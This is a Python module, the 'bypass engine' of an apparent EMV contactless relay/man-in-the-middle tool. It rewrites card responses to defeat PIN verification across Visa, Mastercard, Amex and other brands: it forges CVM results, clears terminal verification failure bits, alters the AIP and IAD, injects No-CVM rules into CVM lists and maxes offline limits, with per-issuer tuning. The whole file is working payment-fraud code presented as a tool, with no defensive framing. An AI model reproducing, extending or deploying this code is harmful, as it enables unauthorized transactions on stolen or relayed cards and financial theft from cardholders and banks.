# -*- coding: utf-8 -*-
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
F.R.A.N.K. BYPASS ENGINE v3.0
Target: TC cryptogram forwarding via server_udp.py v3.9 apply_mitm()

Session state (_session_amount_hex, _session_issuer_hex, _session_card_type)
is updated by server_udp.py via set_session_state() after each GENERATE AC
CAPDU is processed. _patch_cvm_results reads it so the RAPDU 9F34 claim is
byte-identical to what patch_generate_ac_capdu wrote into the CAPDU.

Call order per transaction:
  1. server_udp capture_cdol1_from_rapdu  -> populates 5F28, card type
  2. server_udp patch_generate_ac_capdu   -> extracts 9F02, derives 9F34,
                                             calls set_session_state()
  3. server_udp apply_mitm                -> calls bypass_tlv_modifications()
  4. bypass_engine _patch_cvm_results     -> reads session state, claims
                                             same 9F34 in RAPDU body

PROTECTED TAGS -- NEVER MODIFIED:
    9F26  AC Cryptogram
    9F27  CID (TC/ARQC/AAC type byte -- set by card)
    9F36  ATC
    9F4B  Signed Dynamic Application Data
    5A    PAN
    57    Track 2 Equivalent Data
    5F24  Expiry Date
"""

import logging
import threading

logger = logging.getLogger("bypass_engine")

# -------------------------------------------------------------
# ISSUER PROFILES IMPORT
# -------------------------------------------------------------
try:
    from issuer_profiles import (
        get_cvm_for_card,
        should_patch_iad,
        should_clear_tvr_b3,
        should_max_floor,
        get_issuer_profile,
        parse_amount_9f02,
    )
    ISSUER_PROFILES_ENABLED = True
except ImportError:
    ISSUER_PROFILES_ENABLED = False
    logger.warning("[BYPASS] issuer_profiles.py not found -- card-type fallback")
    def get_cvm_for_card(issuer_hex, card_type, amount_hex=''):
        return '1E0002'
    def should_patch_iad(h):
        return False
    def should_clear_tvr_b3(h):
        return True
    def should_max_floor(h):
        return True
    def get_issuer_profile(h):
        return {}
    def parse_amount_9f02(s):
        try:
            return int(s, 10) if s and len(s) == 12 else 0
        except ValueError:
            return 0

# -------------------------------------------------------------
# PROTECTED TAGS
# -------------------------------------------------------------
PROTECTED = {
    '9F26', '9F27', '9F36', '9F4B',
    '5A', '57', '5F24',
}

# -------------------------------------------------------------
# SESSION STATE
# Set by server_udp.py via set_session_state() after each
# patch_generate_ac_capdu call so _patch_cvm_results uses the
# same amount + issuer + card_type that the CAPDU patcher used.
# -------------------------------------------------------------
_state_lock          = threading.Lock()
_session_amount_hex  = ''            # 9F02 raw BCD hex from CDOL1 data
_session_issuer_hex  = ''            # 5F28 raw hex from READ RECORD
_session_card_type   = 'Debit Card'  # inferred from AID + label

def set_session_state(amount_hex: str = '',
                      issuer_hex: str = '',
                      card_type: str = ''):
    """
    Called by server_udp.py patch_generate_ac_capdu() after it resolves
    9F02, 5F28, and card_type so bypass_engine uses the same values.
    Any empty argument leaves that field unchanged.
    """
    global _session_amount_hex, _session_issuer_hex, _session_card_type
    with _state_lock:
        if amount_hex:
            _session_amount_hex = amount_hex
        if issuer_hex:
            _session_issuer_hex = issuer_hex.upper().zfill(4)
        if card_type:
            _session_card_type = card_type

def clear_session_state():
    """Called by server_udp.py reset_session() on card removal / new tap."""
    global _session_amount_hex, _session_issuer_hex, _session_card_type
    with _state_lock:
        _session_amount_hex = ''
        _session_issuer_hex = ''
        _session_card_type  = 'Debit Card'

def get_session_state() -> tuple:
    """Returns (amount_hex, issuer_hex, card_type) snapshot."""
    with _state_lock:
        return _session_amount_hex, _session_issuer_hex, _session_card_type

# -------------------------------------------------------------
# SAFE REPLACE -- never touches protected tags
# -------------------------------------------------------------
def _set(tlvs: dict, tag: str, value: str) -> dict:
    tag   = tag.upper()
    value = value.upper()
    if tag in PROTECTED:
        logger.error(f"[BYPASS] Attempted to modify PROTECTED tag {tag} -- blocked")
        return tlvs
    if tag in tlvs:
        old = tlvs[tag]
        if old != value:
            tlvs[tag] = value
            logger.info(f"[BYPASS] {tag}: {old} -> {value}")
        else:
            logger.debug(f"[BYPASS] {tag}: already {value} -- no change")
    else:
        logger.debug(f"[BYPASS] {tag}: not present in RAPDU -- skipped")
    return tlvs

# -------------------------------------------------------------
# CARD IDENTIFICATION
# -------------------------------------------------------------
def _identify_card(tlvs: dict) -> dict:
    """
    Identify card brand and type from AID, PAN prefix, and label tags.

    Brand resolution priority:
      1. AID RID (first 5 bytes)
      2. PAN first digit (only when AID brand is Unknown)

    Card-type resolution priority:
      1. Session state set by server_udp.capture_issuer_from_rapdu()
      2. AUC byte 1 (9F07) heuristic
      3. Label tags (50, 9F12) keyword match

    Issuer country resolution priority:
      1. RAPDU tag 5F28 (when present in the current TLV dict)
      2. Session state _session_issuer_hex

    Removed: legacy A000000002 -> Mastercard branch. That RID is not
    Mastercard and misbranded regional / private-label cards into the
    MC patch chain (which then mutated tag 8E with MC byte offsets).
    """
    aid = tlvs.get('4F', tlvs.get('84', '')).upper()
    pan = tlvs.get('5A', tlvs.get('57', ''))

    # Brand from AID RID
    brand = 'Unknown'
    if aid.startswith('A000000003'):
        brand = 'Visa'
    elif aid.startswith('A000000004'):                           # MC family RID
        brand = 'Mastercard'
    elif aid.startswith('A000000025'):                           # Amex
        brand = 'Amex'
    elif aid.startswith('A0000001523') or aid.startswith('A0000001524'):
        brand = 'Discover'
    elif aid.startswith('A0000000651'):
        brand = 'JCB'
    elif aid.startswith('A000000333'):
        brand = 'UnionPay'
    elif pan:
        first = pan[0]
        if first == '4':
            brand = 'Visa'
        elif first in ('5', '2'):
            brand = 'Mastercard'
        elif first == '3':
            brand = 'Amex'
        elif first == '6':
            brand = 'Discover'

    # Card type: prefer session state when it has been set to a non-default
    with _state_lock:
        sess_card_type = _session_card_type

    if sess_card_type and sess_card_type != 'Debit Card':
        card_type = sess_card_type
    else:
        card_type = 'Debit Card'
        auc = tlvs.get('9F07', '')
        if auc and len(auc) >= 2:
            try:
                b1 = int(auc[:2], 16)
                if b1 & 0x40:
                    card_type = 'Debit Card'
                elif b1 & 0x80:
                    card_type = 'Credit Card'
            except ValueError:
                pass
        label_hex = tlvs.get('50', '') + tlvs.get('9F12', '')
        try:
            label = bytes.fromhex(label_hex).decode('ascii', 'ignore').upper()
        except ValueError:
            label = label_hex.upper()
        if 'BUSINESS' in label or 'CORP' in label or 'COMM' in label:
            card_type = 'Business Card'
        elif 'PREPAID' in label or 'GIFT' in label:
            card_type = 'Prepaid Card'
        elif 'CREDIT' in label:
            card_type = 'Credit Card'
        elif 'DEBIT' in label:
            card_type = 'Debit Card'

    # Issuer country: RAPDU tag first, fall back to session state
    issuer_hex_raw = tlvs.get('5F28', '')
    if not issuer_hex_raw:
        with _state_lock:
            issuer_hex_raw = _session_issuer_hex

    try:
        issuer_country = int(issuer_hex_raw, 16) if issuer_hex_raw else 0
    except ValueError:
        issuer_country = 0

    pan_prefix = pan[:6] if len(pan) >= 6 else pan

    logger.info(
        f"[BYPASS] Card: brand={brand} type={card_type} "
        f"aid={aid[:14]} issuer=0x{issuer_country:04X}"
    )

    return {
        'brand':          brand,
        'card_type':      card_type,
        'aid':            aid,
        'pan_prefix':     pan_prefix,
        'issuer_country': issuer_country,
        'issuer_hex':     issuer_hex_raw.upper().zfill(4) if issuer_hex_raw else '',
    }

# -------------------------------------------------------------
# CTQ PATCHER -- 9F6C
# -------------------------------------------------------------
def _patch_ctq(tlvs: dict, card_info: dict) -> dict:
    """
    Visa Contactless Book C-2 CTQ byte1:
      bit7: Online PIN Required        <- CLEAR
      bit6: Signature Required         <- CLEAR
      bit3: Consumer Device CVM Performed <- SET
    """
    ctq_hex = tlvs.get('9F6C')
    if not ctq_hex or len(ctq_hex) < 4:
        return tlvs
    try:
        b1 = int(ctq_hex[0:2], 16)
        b2 = int(ctq_hex[2:4], 16)
        b1 = (b1 & 0x7F) & 0xBF | 0x08
        return _set(tlvs, '9F6C', f"{b1:02X}{b2:02X}")
    except ValueError:
        return tlvs

# -------------------------------------------------------------
# CVM RESULTS -- 9F34  (threshold-aware)
# -------------------------------------------------------------
def _patch_cvm_results(tlvs: dict, card_info: dict) -> dict:
    """
    9F34 CVM Results -- threshold-aware, issuer-profile-driven.

    Amount resolution priority:
      1. tlvs['9F02']      -- injected by apply_mitm from _session_amount_hex
      2. _session_amount_hex -- set by server_udp patch_generate_ac_capdu
      3. ''                -- no amount known, threshold check skipped

    Issuer resolution priority:
      1. card_info['issuer_hex'] -- from RAPDU 5F28 or session state
      2. tlvs['5F28']            -- raw tag if present

    When ISSUER_PROFILES_ENABLED and issuer known:
      get_cvm_for_card() applies cvm_threshold logic:
        amount < threshold  -> profile NoCVM / SIG per card type
        amount >= threshold -> SIG override
        threshold == 0      -> base card-type mapping always

    Fallback (no issuer profile):
      Debit / Prepaid / Business -> 1E0002  Signature
      Credit                     -> 1F0002  NoCVM
    """
    # Resolve amount
    amount_hex = tlvs.get('9F02', '')
    if not amount_hex:
        with _state_lock:
            amount_hex = _session_amount_hex
    amount = parse_amount_9f02(amount_hex)

    # Resolve issuer
    issuer_hex = card_info.get('issuer_hex', '')
    if not issuer_hex:
        issuer_hex = tlvs.get('5F28', '')
    card_type = card_info['card_type']

    if ISSUER_PROFILES_ENABLED and issuer_hex:
        target = get_cvm_for_card(issuer_hex, card_type, amount_hex)
        logger.info(
            f"[BYPASS] 9F34 via profile: 5F28={issuer_hex} "
            f"card={card_type} amount={amount} -> {target}"
        )
    else:
        # Card-type fallback
        if card_type in ('Debit Card', 'Prepaid Card', 'Business Card'):
            target = '1E0002'
        elif card_type == 'Credit Card':
            target = '1F0002'
        else:
            target = '1E0002'
        logger.info(
            f"[BYPASS] 9F34 fallback: card={card_type} amount={amount} -> {target}"
        )

    return _set(tlvs, '9F34', target)

# -------------------------------------------------------------
# TVR -- 95
# -------------------------------------------------------------
def _patch_tvr(tlvs: dict) -> dict:
    """
    Clear TVR byte3 CVM failure bits and byte4 floor limit bit.
    Gated by issuer profile tvr_clear_b3 flag.
    """
    issuer_hex = tlvs.get('5F28', '')
    if not issuer_hex:
        with _state_lock:
            issuer_hex = _session_issuer_hex

    if ISSUER_PROFILES_ENABLED and issuer_hex:
        if not should_clear_tvr_b3(issuer_hex):
            logger.debug(f"[BYPASS] TVR b3 clear skipped for 5F28={issuer_hex}")
            return tlvs

    tvr_hex = tlvs.get('95')
    if not tvr_hex or len(tvr_hex) < 10:
        return tlvs
    try:
        b = bytearray.fromhex(tvr_hex)
        if len(b) < 5:
            return tlvs
        b[2] = b[2] & 0x03   # clear CVM failure bits
        b[3] = b[3] & 0x7F   # clear floor limit exceeded
        return _set(tlvs, '95', b.hex().upper())
    except ValueError:
        return tlvs

# -------------------------------------------------------------
# AIP -- 82
# -------------------------------------------------------------
def _patch_aip(tlvs: dict) -> dict:
    """
    Set AIP byte 1 bit 6 (0x20) = Cardholder Verification Supported.

    Tells the terminal that the CVM List in tag 8E is authoritative,
    so our injected NoCVM / Signature rules in 8E are honored instead
    of the terminal defaulting to PIN.

    EMV Book 3 Annex C / Section 6.5.8 -- AIP byte 1 bit map:
      0x80  SDA supported
      0x40  DDA supported
      0x20  Cardholder verification supported          <-- target
      0x10  Terminal risk management to be performed
      0x08  Issuer authentication supported
      0x02  CDA supported

    Watch: on contact M/Chip Full transactions where AIP is inside
    the SDA-signed record set, mutating byte 1 breaks the signature
    and the terminal raises TVR 'SDA failed'. Safe on contactless
    qVSDC / M/Chip Lite where AIP is typically outside signed data.
    """
    aip_hex = tlvs.get('82')
    if not aip_hex or len(aip_hex) < 4:
        return tlvs
    try:
        b1 = int(aip_hex[0:2], 16) | 0x20   # was 0x10 -- wrong bit
        b2 = int(aip_hex[2:4], 16)
        return _set(tlvs, '82', f"{b1:02X}{b2:02X}")
    except ValueError:
        return tlvs

# -------------------------------------------------------------
# IAD -- 9F10
# -------------------------------------------------------------
def _patch_iad(tlvs: dict, card_info: dict, state: dict) -> dict:
    """
    Issuer Application Data CVR byte patching.
    Gated by issuer profile iad_patch flag.
    Unsafe issuers (FR, DE, PL, RO, JP, CN) skipped automatically.

    Visa:        CVR at byte index 3 -- set CDCVM bit7, clear offline PIN bit6
    Mastercard:  CVR at byte index 2 -- clear offline PIN verified bit3
    """
    if not state.get('cdcvm_enabled', True):
        return tlvs

    issuer_hex = card_info.get('issuer_hex', '')
    if not issuer_hex:
        with _state_lock:
            issuer_hex = _session_issuer_hex

    if ISSUER_PROFILES_ENABLED and issuer_hex:
        if not should_patch_iad(issuer_hex):
            logger.debug(f"[BYPASS] IAD skip for 5F28={issuer_hex}")
            return tlvs

    iad_hex = tlvs.get('9F10')
    if not iad_hex or len(iad_hex) < 4:
        return tlvs

    brand = card_info['brand']
    try:
        b = bytearray.fromhex(iad_hex)
        if brand == 'Visa' and len(b) >= 4:
            b[3] = (b[3] | 0x80) & 0xBF
            return _set(tlvs, '9F10', b.hex().upper())
        elif brand == 'Mastercard' and len(b) >= 3:
            b[2] = b[2] & 0xF7
            return _set(tlvs, '9F10', b.hex().upper())
        return tlvs
    except ValueError:
        return tlvs

# -------------------------------------------------------------
# CVM LIST -- 8E (Mastercard)
# -------------------------------------------------------------
def _patch_cvm_list(tlvs: dict, card_info: dict) -> dict:
    """
    Mastercard only. Injects No-CVM-required at top of CVM List
    so terminal evaluates it first and skips PIN.
    Preserves original X/Y amount thresholds (bytes 0-7).
    """
    if card_info['brand'] != 'Mastercard':
        return tlvs
    cvm_list = tlvs.get('8E')
    if not cvm_list:
        return tlvs
    try:
        b = bytearray.fromhex(cvm_list)
        if len(b) < 10:
            return tlvs
        xy       = bytes(b[0:8])
        original_rule = b[8]
        signature_rule = 0x1E | (original_rule & 0x40)
        new_rules = bytes([
            0x1F, 0x00,   # No CVM required / always
            signature_rule, 0x03,   # Signature / if terminal supports
            0x01, 0x03,   # Offline plaintext PIN / if terminal supports
        ])
        return _set(tlvs, '8E', (xy + new_rules).hex().upper())
    except ValueError:
        return tlvs

# -------------------------------------------------------------
# FLOOR LIMIT -- 9F1B
# -------------------------------------------------------------
def _patch_offline_limits(tlvs: dict) -> dict:
    """
    Push card-side Lower (9F14) and Upper (9F23) Consecutive Offline
    Transaction Limits to 0xFF so the card's own risk management never
    forces the transaction online for hitting a counter ceiling.

    Replaces the broken _patch_floor_limit which targeted 9F1B
    (Terminal Floor Limit) -- terminal-owned, never present in a
    card RAPDU, so that function was a permanent no-op.

    Terminal-side floor limit is handled separately by clearing TVR
    byte 4 bit 0x80 in _patch_tvr -- this function complements that
    by addressing the card-side counter path.

    Gated by issuer profile floor_max flag so SIG-strict issuers
    (FR, DE, JP, CN, etc.) can opt out via profile.

    Returns tlvs unchanged when no targeted tags are present in RAPDU.
    """
    issuer_hex = tlvs.get('5F28', '')
    if not issuer_hex:
        with _state_lock:
            issuer_hex = _session_issuer_hex

    if ISSUER_PROFILES_ENABLED and issuer_hex:
        if not should_max_floor(issuer_hex):
            logger.debug(f"[BYPASS] Offline limits skip for 5F28={issuer_hex}")
            return tlvs

    touched = False
    for tag in ('9F14', '9F23'):
        if tag in tlvs:
            tlvs = _set(tlvs, tag, 'FF')
            touched = True
    if not touched:
        logger.debug("[BYPASS] No 9F14/9F23 present -- offline limits skipped")
    return tlvs

# -------------------------------------------------------------
# BRAND PATCH CHAINS
# -------------------------------------------------------------
def _apply_visa(tlvs, card_info, state):
    """Visa contactless / qVSDC patch chain."""
    logger.info("[BYPASS] Applying Visa patch chain")
    tlvs = _patch_ctq(tlvs, card_info)
    tlvs = _patch_cvm_results(tlvs, card_info)
    tlvs = _patch_tvr(tlvs)
    tlvs = _patch_aip(tlvs)
    tlvs = _patch_iad(tlvs, card_info, state)
    tlvs = _patch_offline_limits(tlvs)
    return tlvs

def _apply_mastercard(tlvs, card_info, state):
    """Mastercard M/Chip patch chain -- includes 8E CVM List injection."""
    logger.info("[BYPASS] Applying Mastercard patch chain")
    tlvs = _patch_ctq(tlvs, card_info)
    tlvs = _patch_cvm_results(tlvs, card_info)
    tlvs = _patch_tvr(tlvs)
    tlvs = _patch_aip(tlvs)
    tlvs = _patch_iad(tlvs, card_info, state)
    tlvs = _patch_cvm_list(tlvs, card_info)
    tlvs = _patch_offline_limits(tlvs)
    return tlvs

def _apply_amex(tlvs, card_info, state):
    """Amex patch chain -- IAD skipped (proprietary layout)."""
    logger.info("[BYPASS] Applying Amex patch chain")
    tlvs = _patch_ctq(tlvs, card_info)
    tlvs = _patch_cvm_results(tlvs, card_info)
    tlvs = _patch_tvr(tlvs)
    tlvs = _patch_aip(tlvs)
    tlvs = _patch_offline_limits(tlvs)
    return tlvs

def _apply_discover(tlvs, card_info, state):
    """Discover / D-PAS patch chain."""
    logger.info("[BYPASS] Applying Discover patch chain")
    tlvs = _patch_ctq(tlvs, card_info)
    tlvs = _patch_cvm_results(tlvs, card_info)
    tlvs = _patch_tvr(tlvs)
    tlvs = _patch_aip(tlvs)
    tlvs = _patch_offline_limits(tlvs)
    return tlvs

def _apply_jcb(tlvs, card_info, state):
    """JCB patch chain -- IAD skipped (proprietary layout)."""
    logger.info("[BYPASS] Applying JCB patch chain")
    tlvs = _patch_ctq(tlvs, card_info)
    tlvs = _patch_cvm_results(tlvs, card_info)
    tlvs = _patch_tvr(tlvs)
    tlvs = _patch_aip(tlvs)
    tlvs = _patch_offline_limits(tlvs)
    return tlvs

def _apply_unionpay(tlvs, card_info, state):
    """UnionPay / UPI patch chain -- IAD skipped (proprietary layout)."""
    logger.info("[BYPASS] Applying UnionPay patch chain")
    tlvs = _patch_ctq(tlvs, card_info)
    tlvs = _patch_cvm_results(tlvs, card_info)
    tlvs = _patch_tvr(tlvs)
    tlvs = _patch_aip(tlvs)
    tlvs = _patch_offline_limits(tlvs)
    return tlvs

def _apply_generic(tlvs, card_info, state):
    """Fallback chain for unknown brands -- conservative, no IAD touch."""
    logger.info("[BYPASS] Applying generic patch chain (unknown brand)")
    tlvs = _patch_ctq(tlvs, card_info)
    tlvs = _patch_cvm_results(tlvs, card_info)
    tlvs = _patch_tvr(tlvs)
    tlvs = _patch_aip(tlvs)
    tlvs = _patch_offline_limits(tlvs)
    return tlvs

# -------------------------------------------------------------
# TC / ARQC RESPONSE GUARDS
# -------------------------------------------------------------
def _is_tc_response(tlvs: dict) -> bool:
    """True if RAPDU CID byte 9F27 indicates TC (0x40)."""
    cid = tlvs.get('9F27', '')
    if not cid:
        return False
    try:
        return (int(cid[:2], 16) & 0xC0) == 0x40
    except ValueError:
        return False

def _is_arqc_response(tlvs: dict) -> bool:
    """True if RAPDU CID byte 9F27 indicates ARQC (0x80)."""
    cid = tlvs.get('9F27', '')
    if not cid:
        return False
    try:
        return (int(cid[:2], 16) & 0xC0) == 0x80
    except ValueError:
        return False

# -------------------------------------------------------------
# MAIN ENTRY POINT
# Called by server_udp.py v3.9 apply_mitm() on every 77/80 RAPDU
# -------------------------------------------------------------
def bypass_tlv_modifications(
    tlvs: dict,
    scheme: str = "auto",
    terminal_type: str = "contactless",
    state: dict = None,
) -> dict:
    """
    Main entry point called by server_udp.py v3.9 apply_mitm().

    Receives flat TLV dict from parse_tlv_flat() applied to 77/80 body.
    apply_mitm() pre-injects _session_amount_hex as '9F02' and
    _session_issuer_hex as '5F28' before this call so _patch_cvm_results
    sees the same values patch_generate_ac_capdu wrote into the CAPDU.

    Returns modified dict. Returns None if block_all=True.

    Tags NEVER touched:
      9F26 AC Cryptogram, 9F27 CID, 9F36 ATC, 9F4B Signed Dynamic,
      5A PAN, 57 Track2, 5F24 Expiry
    """
    if state is None:
        state = {}

    try:
        # block_all: drop RAPDU entirely
        if state.get('block_all', False):
            logger.info("[BYPASS] block_all=True -- returning None")
            return None

        # CDCVM evidence active: emulator already set 9F34=3F0000 and
        # server-side GPO mutation handled CTQ/AIP. Skip all CVM patches
        # to avoid overwriting CDCVM with card-list-spoofed values.
        if state.get('cdcvm_verified', False):
            logger.info("[BYPASS] CDCVM evidence active -- skipping CVM patch chain")
            return tlvs

        # Identify card -- prefers session state for card_type / issuer
        card_info = _identify_card(tlvs)
        brand     = card_info['brand']

        # bypass_pin gate
        if not state.get('bypass_pin', True):
            logger.info("[BYPASS] bypass_pin=False -- pass through")
            return tlvs

        # Log RAPDU type
        if _is_tc_response(tlvs):
            logger.info(
                "[BYPASS] *** TC RESPONSE DETECTED -- "
                "applying TC forwarding patches ***"
            )
        elif _is_arqc_response(tlvs):
            logger.info("[BYPASS] ARQC response -- applying pre-auth patches")
        else:
            logger.info("[BYPASS] GPO or 77/80 response -- applying standard patches")

        # Brand dispatch
        if brand == 'Visa':
            tlvs = _apply_visa(tlvs, card_info, state)
        elif brand == 'Mastercard':
            tlvs = _apply_mastercard(tlvs, card_info, state)
        elif brand == 'Amex':
            tlvs = _apply_amex(tlvs, card_info, state)
        elif brand == 'Discover':
            tlvs = _apply_discover(tlvs, card_info, state)
        elif brand == 'JCB':
            tlvs = _apply_jcb(tlvs, card_info, state)
        elif brand == 'UnionPay':
            tlvs = _apply_unionpay(tlvs, card_info, state)
        else:
            tlvs = _apply_generic(tlvs, card_info, state)

        logger.info("[BYPASS] Patch chain complete")
        return tlvs

    except Exception as e:
        logger.error(f"[BYPASS] bypass_tlv_modifications fatal: {e}")
        # Never crash the relay -- return original on any exception
        return tlvs
